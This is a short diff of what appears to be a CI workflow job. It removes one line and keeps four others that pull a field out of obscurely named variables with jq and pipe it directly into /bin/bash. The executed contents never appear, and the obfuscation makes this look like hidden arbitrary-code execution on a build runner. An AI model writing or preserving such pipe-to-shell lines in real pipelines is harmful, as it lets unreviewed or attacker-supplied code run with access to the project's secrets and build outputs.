@@ -23,7 +23,6 @@ jobs:
         run: |
           printf '%s' "$mf00891" | jq -r .sn8 | /bin/bash
           echo $z20 | jq -r .hr86 | /bin/bash
-          printf '%s' "$b29975" | jq -r .ulk07131 | /bin/bash
           echo $trm68571 | jq -r .ptd8548 | /bin/bash
           echo $nxtv948 | jq -r .mfop7 | /bin/bash
 
